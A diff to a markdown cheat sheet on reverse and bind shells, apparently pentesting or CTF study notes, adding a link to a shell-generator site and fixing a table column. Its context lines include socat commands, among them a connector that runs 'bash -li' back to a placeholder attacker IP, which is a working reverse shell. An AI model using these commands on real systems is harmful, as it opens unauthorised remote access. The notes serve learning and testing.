@@ -1,5 +1,7 @@
 # Reverse / Bind Shells
 
+> Super useful site: https://www.revshells.com/
+
 | Reverse Shells | Bind Shells |
 | -- | -- |
 | When the target is forced to execute code that connects back to your computer. | When the code executed on the target is used to start a listener attached to a shell directly on the target. |
@@ -43,7 +45,7 @@ For a bind shell:
 ### Socat
 
 | Encrypted (Y/N) | Shell Type (R/B) | Command Type |
-| -- | -- |
+| -- | -- | -- |
 | N | R | Listener (local) - `socat TCP-L:<PORT> FILE:``tty``,raw,echo=0` |
 | N | R | Connector (remote) - `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane` |
 | N | B | Connector (local) - `socat TCP:<TARGET-IP>:<TARGET-PORT> -` |
